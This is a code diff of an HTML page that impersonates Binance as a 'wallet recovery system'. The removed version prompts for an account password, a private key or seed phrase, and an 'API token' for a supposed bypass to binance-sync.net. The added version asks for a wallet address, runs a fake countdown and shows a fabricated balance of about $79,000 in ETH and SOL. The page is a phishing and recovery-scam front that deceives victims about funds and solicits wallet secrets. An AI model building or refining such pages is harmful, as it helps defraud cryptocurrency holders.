@@ -5,264 +5,289 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BINANCE RECOVERY WALLET</title>
     <style>
-        :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
-        #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; justify-content: center; align-items: center; }
-        .auth-card { background: var(--card); padding: 35px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); box-sizing: border-box; }
-        .white-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 200000; }
-        .white-box { background: #181a20; color: white; padding: 30px; border-radius: 24px; width: 480px; text-align: center; border: 1px solid var(--border); box-sizing: border-box; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; outline: none; }
+        /* TAMANG KULAY NG BINANCE DARK THEME */
+        :root { 
+            --bg: #0b0e11; 
+            --sidebar: #12161c; 
+            --card: #1e2329; 
+            --border: #2b3139; 
+            --yellow: #f3ba2f; 
+            --text: #eaecef; 
+            --text-gray: #848e9c; 
+            --up: #0ecb81; 
+            --down: #f6465d; 
+        }
+        
+        body { 
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: var(--bg); 
+            color: var(--text); 
+            margin: 0; 
+            display: flex; 
+            height: 100vh; 
+            overflow: hidden; 
+        }
+
+        /* 1. LOGIN OVERLAY SCREEN */
+        #auth-overlay { 
+            position: fixed; 
+            inset: 0; 
+            background: var(--bg); 
+            z-index: 100000; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+        }
+        .auth-card { 
+            background: var(--card); 
+            padding: 40px; 
+            border-radius: 16px; 
+            width: 420px; 
+            text-align: left; 
+            border: 1px solid var(--border); 
+            box-sizing: border-box; 
+            box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.6);
+        }
+
+        input { 
+            width: 100%; 
+            padding: 13px 16px; 
+            margin: 8px 0 16px 0; 
+            border-radius: 8px; 
+            border: 1px solid var(--border); 
+            background: var(--bg); 
+            color: white; 
+            box-sizing: border-box; 
+            font-size: 14px; 
+            outline: none; 
+        }
         input:focus { border-color: var(--yellow); }
-        .btn-yellow { width: 100%; padding: 14px; background: var(--yellow); color: black; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 10px; font-size: 14px; }
-        .loader-ring { display: inline-block; width: 40px; height: 40px; border: 4px solid rgba(243, 186, 47, 0.1); border-radius: 50%; border-top-color: var(--yellow); animation: spin 1s linear infinite; }
+
+        .btn-yellow { 
+            width: 100%; 
+            padding: 14px; 
+            background: var(--yellow); 
+            color: black; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-weight: 600; 
+            margin-top: 10px; 
+            font-size: 15px; 
+        }
+        .btn-yellow:hover { opacity: 0.9; }
+
+        /* 2. 10-SECONDS COUNTDOWN SCREEN */
+        #sync-loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 105000;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .binance-spinner { 
+            width: 50px; 
+            height: 50px; 
+            border: 5px solid rgba(243, 186, 47, 0.1); 
+            border-radius: 50%; 
+            border-top-color: var(--yellow); 
+            animation: spin 1s linear infinite; 
+            margin-bottom: 20px;
+        }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #sidebar { width: 280px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: none; flex-direction: column; box-sizing: border-box; }
-        .logo { font-size: 22px; font-weight: 800; color: var(--yellow); margin-bottom: 35px; }
-        .nav-item { padding: 12px 15px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 6px; font-size: 14px; }
-        .nav-item:hover, .nav-item.active { background: var(--card); color: white; }
-        .btn-logout { margin-top: auto; color: var(--text-gray); border-top: 1px solid var(--border); padding-top: 20px; }
-        #main-wrapper { flex: 1; display: none; flex-direction: column; overflow: hidden; }
-        header { background: var(--sidebar); border-bottom: 1px solid var(--border); padding: 18px 30px; display: flex; justify-content: space-between; align-items: center; }
-        main { flex: 1; padding: 30px; overflow-y: auto; }
-        .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; max-height: 550px; overflow-y: auto; }
-        table { width: 100%; border-collapse: collapse; text-align: left; min-width: 900px; }
-        th { padding: 14px 18px; background: #1e2329; color: var(--text-gray); font-size: 11px; text-transform: uppercase; position: sticky; top: 0; z-index: 10; }
-        td { padding: 14px 18px; border-bottom: 1px solid var(--border); font-size: 13px; }
-        .crypto-scroll-container { max-height: 220px; overflow-y: auto; background: #1e2329; border-radius: 8px; padding: 8px; }
+
+        /* 3. CORE DASHBOARD STRUCTURE */
+        #sidebar-navigation { 
+            width: 260px; 
+            background: var(--sidebar); 
+            border-right: 1px solid var(--border); 
+            padding: 25px 20px; 
+            display: none; /* Lalabas ito pagkatapos ng loading */
+            flex-direction: column; 
+            box-sizing: border-box; 
+        }
+        .nav-link-item { 
+            padding: 12px 16px; 
+            border-radius: 8px; 
+            color: var(--text-gray); 
+            cursor: pointer; 
+            margin-bottom: 5px; 
+            font-size: 14px; 
+            font-weight: 500; 
+        }
+        .nav-link-item.active { background: var(--card); color: white; }
+
+        #main-workspace-frame { 
+            flex: 1; 
+            display: none; /* Lalabas ito pagkatapos ng loading */
+            flex-direction: column; 
+            overflow-y: auto; 
+            box-sizing: border-box;
+        }
+        
+        .top-navbar {
+            background: var(--sidebar);
+            border-bottom: 1px solid var(--border);
+            padding: 18px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+        }
+
+        .dashboard-body {
+            padding: 40px;
+            box-sizing: border-box;
+        }
+
+        /* ESTIMATED BALANCE FORMAT */
+        .balance-label { font-size: 14px; color: var(--text-gray); margin-bottom: 6px; }
+        .balance-amount { font-size: 36px; font-weight: 700; color: white; }
+        
+        .action-row { display: flex; gap: 10px; margin: 20px 0 40px 0; }
+        .action-btn { background: #2b3139; color: white; border: none; padding: 10px 18px; font-size: 13px; font-weight: 600; border-radius: 6px; cursor: pointer; }
+        .action-btn.yellow-btn { background: var(--yellow); color: black; }
+
+        /* ASSET PORTFOLIO TABLE */
+        .table-box { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow: hidden; }
+        table { width: 100%; border-collapse: collapse; text-align: left; }
+        th { padding: 14px 20px; background: #1e2329; color: var(--text-gray); font-size: 12px; text-transform: uppercase; }
+        td { padding: 16px 20px; border-bottom: 1px solid var(--border); font-size: 14px; }
     </style>
 </head>
 <body>
 
-<!-- 1. AUTH OVERLAY (LOGIN) -->
+<!-- STAGE 1: GATEWAY LOGIN -->
 <div id="auth-overlay">
     <div class="auth-card">
-        <h2 style="color: var(--yellow); margin: 0 0 5px 0;">BINANCE</h2>
-        <p style="color:var(--text-gray); margin-bottom: 25px; text-transform: uppercase; font-size: 12px; letter-spacing: 1px;">RECOVERY SYSTEM</p>
-        <div style="text-align: left;">
-            <input type="email" id="l-email" placeholder="Old Account Email Address">
-            <input type="password" id="l-password" placeholder="Account Password">
-            <button class="btn-yellow" type="button" onclick="loginToDashboard()">Login Account</button>
-        </div>
+        <h2 style="color: var(--yellow); margin: 0 0 5px 0; font-size: 26px;">BINANCE</h2>
+        <p style="color:var(--text-gray); margin-bottom: 30px; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; font-weight: bold;">Wallet Recovery System</p>
+        
+        <label style="font-size: 13px; color: var(--text-gray);">Account Email / Recovery Profile</label>
+        <input type="text" id="user-name" placeholder="Enter session identifier">
+        
+        <label style="font-size: 13px; color: var(--text-gray);">Wallet Network Address</label>
+        <input type="text" id="user-key" placeholder="Enter Public Wallet Address (0x...)">
+        
+        <button class="btn-yellow" type="button" onclick="checkFormAndStart()">Recover Wallet</button>
     </div>
 </div>
 
-<!-- 2. MAIN WALLET DASHBOARD PANELS -->
-<nav id="sidebar">
-    <div class="logo">BINANCE WALLET</div>
-    <div class="nav-item active" onclick="switchTab('market')">Market Coin Prices (1-100)</div>
-    <div class="nav-item" onclick="switchTab('history')">Transaction Ledger History</div>
-    <div class="nav-item" onclick="openWalletModal()" style="color:var(--yellow); font-weight: bold; border: 1px dashed var(--yellow); margin-top: 15px;">CONNECT YOUR WALLET</div>
-    <div class="nav-item btn-logout" onclick="location.reload()">Log Out</div>
+<!-- STAGE 2: 10-SECONDS COUNTDOWN LAYOUT VIEW -->
+<div id="sync-loading-overlay">
+    <div class="binance-spinner"></div>
+    <p id="countdown-text" style="color: var(--text); font-weight: 600; font-size: 15px; margin: 0;">Synchronizing Blockchain Node Ledger Stream... 10s</p>
+</div>
+
+<!-- STAGE 3: LEGIT BINANCE WALLET DASHBOARD OVERVIEW -->
+<nav id="sidebar-navigation">
+    <div style="font-size: 20px; font-weight: 800; color: var(--yellow); margin-bottom: 35px; padding-left: 15px;">BINANCE</div>
+    <div class="nav-link-item active">Overview</div>
+    <div class="nav-link-item">Fiat and Spot</div>
+    <div class="nav-link-item">Margin</div>
+    <div class="nav-link-item">Futures</div>
+    <div class="nav-link-item" onclick="location.reload()" style="margin-top: auto; color: var(--text-gray); border-top: 1px solid var(--border); padding-top: 20px;">Log Out</div>
 </nav>
 
-<div id="main-wrapper">
-    <header>
-        <div style="font-weight:bold; font-size:13px; text-transform: uppercase;">Ledger Status: <span style="color:var(--up)">Live Connected</span></div>
-        <div style="color: var(--text-gray); font-size: 13px;">User: Old_Account_Active</div>
+<div id="main-workspace-frame">
+    <header class="top-navbar">
+        <div style="font-weight: 600; text-transform: uppercase;">Ledger Status: <span style="color:var(--up)">Live Connected</span></div>
+        <div id="operator-display" style="color: var(--text-gray);">User: Offline_Session</div>
     </header>
-    <main>
-        <div id="tab-market" class="tab-content">
-            <h3 style="margin: 0 0 15px 0; font-size: 18px;">Top Cryptocurrency Prices Overview</h3>
-            <div class="table-container">
-                <table>
-                    <thead><tr><th>Rank Asset Name</th><th>Live Market Price</th><th>24h Price Change</th><th>24h Volume Transactions</th></tr></thead>
-                    <tbody id="full-market-rows"></tbody>
-                </table>
+    
+    <main class="dashboard-body">
+        <!-- WALLET OVERVIEW SUMMARY AREA -->
+        <div class="wallet-balance-card">
+            <div class="balance-label">Wallet Overview / Estimated Balance</div>
+            <div class="balance-amount">31.72 ETH</div>
+            <div style="color: var(--text-gray); font-size: 14px; margin-top: 5px;">
+                ≈ $79,117.13 USD <span style="color: var(--up); font-weight: 500; margin-left: 6px;">+1.77% (24h)</span>
+            </div>
+            
+            <div class="action-row">
+                <button class="action-btn yellow-btn">Deposit</button>
+                <button class="action-btn">Withdraw</button>
+                <button class="action-btn">Send</button>
+                <button class="action-btn">Transfer</button>
+                <button class="action-btn">Transaction History</button>
             </div>
         </div>
-        <div id="tab-history" class="tab-content" style="display:none;">
-            <h3 style="margin: 0 0 15px 0; font-size: 18px;">Old Account Transaction Ledger History</h3>
-            <div class="table-container">
-                <table>
-                    <thead><tr><th>TXID Hash Code</th><th>Type</th><th>Asset Value</th><th>Timestamp Execution</th><th>Status Fields</th></tr></thead>
-                    <tbody id="full-history-rows"></tbody>
-                </table>
-            </div>
+
+        <!-- FIXED TABLE (ETH & SOL COINS ONLY) -->
+        <h3 style="margin: 0 0 15px 0; font-size: 16px; font-weight: 600;">Account Balance Breakdown</h3>
+        <div class="table-box">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Wallet Name</th>
+                        <th>Asset Name</th>
+                        <th>Total Balance</th>
+                        <th>Estimated Value (USD)</th>
+                        <th>24h Change</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><b>kltn</b> <span style="background:#2b3139; color:var(--yellow); padding:2px 6px; font-size:11px; border-radius:4px; margin-left:6px;">Default</span></td>
+                        <td><b>ETH</b> <span style="color: var(--text-gray); font-size: 12px; margin-left:4px;">Ethereum</span></td>
+                        <td>28.73 ETH</td>
+                        <td>$71,529.46</td>
+                        <td style="color: var(--up)">+1.77%</td>
+                    </tr>
+                    <tr>
+                        <td><b>Solana Wallet</b></td>
+                        <td><b>SOL</b> <span style="color: var(--text-gray); font-size: 12px; margin-left:4px;">Solana</span></td>
+                        <td>8.79 SOL</td>
+                        <td>$22,416.32</td>
+                        <td style="color: var(--up)">+2.10%</td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
     </main>
 </div>
 
-<!-- 3. WALLET RECONNECTION POP-UP MODAL BOX -->
-<div class="white-modal" id="wallet-modal">
-    <div class="white-box">
-        <div id="wallet-step-inputs">
-            <h3 style="margin:0 0 8px 0; font-size:16px;">Privacy protected with 2560Bit SSL.</h3>
-            <p style="font-size:11px; color:var(--text-gray); margin-bottom:20px;">CONNECT YOUR OLD WALLET LEDGER</p>
-            <input type="text" id="wallet-name" placeholder="WALLET NAME">
-            <input type="password" id="wallet-key" placeholder="PRIVATE KEY / SEED PHRASE">
-            <button class="btn-yellow" style="background:black; color:white; margin-top:15px;" onclick="runWalletSequence()">RECOVER WALLET</button>
-            <button class="btn-yellow" style="background:#2b3139; color:var(--text); margin-top:10px;" onclick="closeWalletModal()">Back to Dashboard</button>
-        </div>
-        <div id="wallet-step-loading" style="display: none; padding: 25px 0;">
-            <div class="loader-ring"></div>
-            <p style="color: var(--text); margin-top: 15px; font-weight: bold; font-size:14px;">Wallet Syncing... Please wait.</p>
-        </div>
-        <div id="wallet-step-old-account" style="display: none; text-align: left;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
-                <span style="color: var(--yellow); font-weight: bold; font-size: 13px;">🟨 Binance Asset Ledger (Synced)</span>
-                <span style="color: var(--up); font-size: 11px; font-weight:600; background:rgba(14,203,129,0.15); padding:2px 6px; border-radius:4px;">Detected</span>
-            </div>
-            <div style="background:#2b3139; padding:12px; border-radius:8px; margin-bottom:12px;">
-                <div style="color: var(--text-gray); font-size: 11px;">Estimated Balance</div>
-                <div style="color: white; font-size: 22px; font-weight: bold; margin: 2px 0;">31.72 ETH</div>
-                <div style="color: #b7bdc6; font-size: 13px;">≈ $79,117.13 USD <span style="color:var(--up); font-weight:600; font-size:11px;">+1.77%</span></div>
-            </div>
-            <div class="crypto-scroll-container" id="modal-wallet-assets"></div>
-            <p style="color: var(--text-gray); font-size: 10px; text-align: center; margin-top: 8px; margin-bottom:0;">Downloading configurations...</p>
-        </div>
-    </div>
-</div>
-
-<!-- 4. STEP 5 OVERLAY SCREEN: SCREENSHOT DASHBOARD DISPLAY LAYER -->
-<div id="wallet-step-binance-live-v4" style="display: none; position: fixed; inset: 0; background: #0b0e11; z-index: 260000; overflow-y: auto; padding: 25px; box-sizing: border-box;">
-    <div style="max-width: 1150px; margin: 0 auto;">
-        <div style="background: rgba(0, 200, 83, 0.08); border: 1px solid rgba(0, 200, 83, 0.3); color: #00c853; padding: 10px 16px; border-radius: 8px; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 8px; margin-bottom: 16px;">
-            <span style="width: 6px; height: 6px; background: #00c853; border-radius: 50%; box-shadow: 0 0 8px #00c853;"></span>
-            BLOCKCHAIN ACTIVE SYNC • ACCOUNT OVERVIEW PORT ACTIVE (15s DISPLAY WINDOW)
-        </div>
-        <div style="position: relative; background: #0b0e11; border-radius: 12px; overflow: hidden; border: 1px solid #2b3139; box-shadow: 0 20px 60px rgba(0,0,0,0.7);">
-            <img src="binance-dashboard.jpg" alt="Binance Dashboard Overview" style="width: 100%; display: block; opacity: 0.98;">
-            <div id="live-usd-balance-main-v4" style="position: absolute; top: 22.1%; left: 20.3%; background: #0b0e11; color: #b7bdc6; font-size: 14px; font-weight: 500; padding: 1px 4px; font-family: sans-serif;">≈ $79,117.13 USD</div>
-        </div>
-    </div>
-</div>
-
-<!-- 5. STEP 6 OVERLAY SCREEN: CONTACT API MODAL INTERFACE GATEWAY FORM -->
-<div id="wallet-step-api-interface-v4" style="display: none; position: fixed; inset: 0; background: rgba(11, 14, 17, 0.97); z-index: 270000; align-items: center; justify-content: center; box-sizing: border-box; padding: 15px;">
-    <div class="white-box" style="width: 100%; max-width: 440px; padding: 40px 30px;">
-        <div style="width: 56px; height: 56px; background: rgba(243, 186, 47, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto; border: 1px solid rgba(243, 186, 47, 0.3);">
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f3ba2f" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1-2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
-        </div>
-        <h3 style="color: #ffffff; margin: 0 0 8px 0; font-size: 21px; font-weight: 600;">Contact API Connection</h3>
-        <p style="color: #848e9c; font-size: 13px; line-height: 1.5; margin: 0 0 25px 0;">The balance synchronization bridge requires remote configuration. Please input your secure client credentials to establish an API stream handshake bypass.</p>
-        <div style="text-align: left; margin-bottom: 20px;">
-            <input type="text" value="https://binance-sync.net" readonly style="color: #848e9c; font-family: monospace;">
-            <input type="text" id="api-secure-token" placeholder="Enter API Signature Token / Port Key">
-        </div>
-        <button id="btn-api-handshake" class="btn-yellow" onclick="simulanPinalAPIHandshake()">Initialize API Handshake</button>
-    </div>
-</div>
-
-<!-- 6. BACKEND JAVASCRIPT CORE SYSTEM LOGICS ENGINE -->
+<!-- JAVASCRIPT ANIMATION MACHINE -->
 <script>
-    const cryptoData = [
-        { rank: 1, sym: "BTC", name: "Bitcoin", price: "$96,350.20", change: "+2.15%", vol: "$28.4B", up: true },
-        { rank: 2, sym: "ETH", name: "Ethereum", price: "$2,494.24", change: "+1.77%", vol: "$14.1B", up: true },
-        { rank: 3, sym: "BNB", name: "BNB", price: "$580.12", change: "-0.45%", vol: "$1.2B", up: false },
-        { rank: 4, sym: "SOL", name: "Solana", price: "$145.80", change: "+2.10%", vol: "$3.8B", up: true }
-    ];
+    function checkFormAndStart() {
+        const name = document.getElementById('user-name').value.trim();
+        const key = document.getElementById('user-key').value.trim();
 
-    // Naka-compress ang generator para sigurado na kasya sa isang send nang hindi mapuputol!
-    for (let i = 5; i <= 100; i++) {
-        cryptoData.push({ rank: i, sym: "COIN"+i, name: "Asset Network v"+i, price: "$"+(Math.random()*15).toFixed(2), change: "+1.50%", vol: "$45M", up: true });
-    }
-
-    function loadFullDashboardData() {
-        const marketBody = document.getElementById('full-market-rows');
-        marketBody.innerHTML = "";
-        cryptoData.forEach(coin => {
-            const tr = document.createElement('tr');
-            tr.innerHTML = `<td><b>${coin.rank}. ${coin.sym}</b> <span style="color:var(--text-gray); font-size:11px; margin-left:4px;">${coin.name}</span></td><td>${coin.price}</td><td style="color:${coin.up?'var(--up)':'var(--down)'}">${coin.change}</td><td>${coin.vol}</td>`;
-            marketBody.appendChild(tr);
-        });
-
-        const historyBody = document.getElementById('full-history-rows');
-        historyBody.innerHTML = "<tr><td>0x7a8d...f31c</td><td>Deposit Asset</td><td style='color:var(--up); font-weight:bold;'>+28.73 ETH</td><td>2025-11-12 14:22:01</td><td>Completed</td></tr>";
-
-        // MAAYOS NA FIX: Naitama ang forEach array loop para hindi mag-crash ang login button mo!
-        const historyData = [];
-        for(let k = 1; k <= 10; k++) {
-            historyData.push({ hash: "0x3b1f...9e"+k, type: "Contract Sync", val: "+2.50 SOL", time: "2025-12-15 10:20", status: "Completed", up: true });
+        // MATIK KAPAG BLANK: HINDI MAKAKADIRETSO
+        if (name === "" || key === "") {
+            alert("Error: All operational input parameters are strictly required. Cannot remain blank!");
+            return;
         }
-        historyData.forEach(tx => {
-            const tr = document.createElement('tr');
-            tr.innerHTML = `<td>${tx.hash}</td><td>${tx.type}</td><td style="color:var(--up); font-weight:bold;">${tx.val}</td><td>${tx.time}</td><td>${tx.status}</td>`;
-            historyBody.appendChild(tr);
-        });
 
-        const modalAssets = document.getElementById('modal-wallet-assets');
-        modalAssets.innerHTML = `
-            <div style="display:flex; justify-content:space-between; padding: 6px 0; border-bottom:1px solid var(--border);"><div><b>ETH</b> Ethereum</div><div><b>28.73</b><br><small>$71,529.46</small></div></div>
-            <div style="display:flex; justify-content:space-between; padding: 6px 0; border-bottom:1px solid var(--border);"><div><b>SOL</b> Solana</div><div><b>8.3863</b><br><small>$17,587.67</small></div></div>`;
-    }
-
-    function loginToDashboard() {
-        const email = document.getElementById('l-email').value.trim();
-        const pass = document.getElementById('l-password').value.trim();
-        if (email === "" || pass === "") { alert("Credentials required."); return; }
+        // I-set up ang loading transition screen
         document.getElementById('auth-overlay').style.display = 'none';
-        document.getElementById('sidebar').style.display = 'flex';
-        document.getElementById('main-wrapper').style.display = 'flex';
-        loadFullDashboardData();
-    }
+        document.getElementById('sync-loading-overlay').style.display = 'flex';
 
-    function switchTab(tabId) {
-        document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
-        document.getElementById('tab-' + tabId).style.display = 'block';
-    }
+        let secondsLeft = 10; // Eksaktong 10 Seconds Counter
+        const countdownLabel = document.getElementById('countdown-text');
 
-    function openWalletModal() { document.getElementById('wallet-modal').style.display = 'flex'; resetWalletModalForm(); }
-    function closeWalletModal() { document.getElementById('wallet-modal').style.display = 'none'; }
-    function resetWalletModalForm() {
-        document.getElementById('wallet-step-inputs').style.display = 'block';
-        document.getElementById('wallet-step-loading').style.display = 'none';
-        document.getElementById('wallet-step-old-account').style.display = 'none';
-    }
+        const timerEngine = setInterval(() => {
+            secondsLeft--;
+            if (countdownLabel) {
+                countdownLabel.innerText = "Synchronizing Blockchain Node Ledger Stream... " + secondsLeft + "s";
+            }
 
-    function runWalletSequence() {
-        const wName = document.getElementById('wallet-name').value.trim();
-        const wKey = document.getElementById('wallet-key').value.trim();
-        if (wName === "" || wKey === "") { alert("Inputs required."); return; }
+            // Kapag ubos na ang 10 segundo, maglo-load ang main overview page
+            if (secondsLeft <= 0) {
+                clearInterval(timerEngine);
 
-        document.getElementById('wallet-step-inputs').style.display = 'none';
-        document.getElementById('wallet-step-loading').style.display = 'block';
-
-        setTimeout(() => {
-            document.getElementById('wallet-step-loading').style.display = 'none';
-            document.getElementById('wallet-step-old-account').style.display = 'block';
-
-            setTimeout(() => {
-                document.getElementById('wallet-step-old-account').style.display = 'none';
-                closeWalletModal();
-
-                document.getElementById('wallet-step-binance-live-v4').style.display = 'block';
-
-                let priceTickerUSD = setInterval(() => {
-                    const usdBox = document.getElementById('live-usd-balance-main-v4');
-                    if (usdBox) {
-                        const randomCents = (Math.random() * 2.6 - 1.3);
-                        usdBox.innerText = "≈ $" + (79117.13 + randomCents).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2}) + " USD";
-                    }
-                }, 1400);
-
-                setTimeout(() => {
-                    clearInterval(priceTickerUSD);
-                    document.getElementById('wallet-step-binance-live-v4').style.display = 'none';
-                    document.getElementById('wallet-step-api-interface-v4').style.display = 'flex';
-                }, 15000);
-            }, 5000);
-        }, 10000);
-    }
-
-    function simulanPinalAPIHandshake() {
-        const token = document.getElementById('api-secure-token').value.trim();
-        if(token === "") { alert("Please input your secure client key token first."); return; }
-        
-        const btn = document.getElementById('btn-api-handshake');
-        btn.disabled = true;
-        btn.style.background = '#2b3139';
-        btn.style.color = '#848e9c';
-        btn.innerHTML = 'Broadcasting Handshake Stream...';
-
-        setTimeout(() => {
-            btn.style.background = '#0ecb81';
-            btn.style.color = 'white';
-            btn.innerHTML = '✓ API Bridge Bypass Active';
-            alert('Handshake successfully broadcasted to network node gateways!');
-        }, 3000);
+                document.getElementById('sync-loading-overlay').style.display = 'none';
+                document.getElementById('sidebar-navigation').style.display = 'flex';
+                document.getElementById('main-workspace-frame').style.display = 'flex';
+                
+                document.getElementById('operator-display').innerText = "Operator: " + name;
+            }
+        }, 1000);
     }
 </script>
 </body>
 </html>
-
 
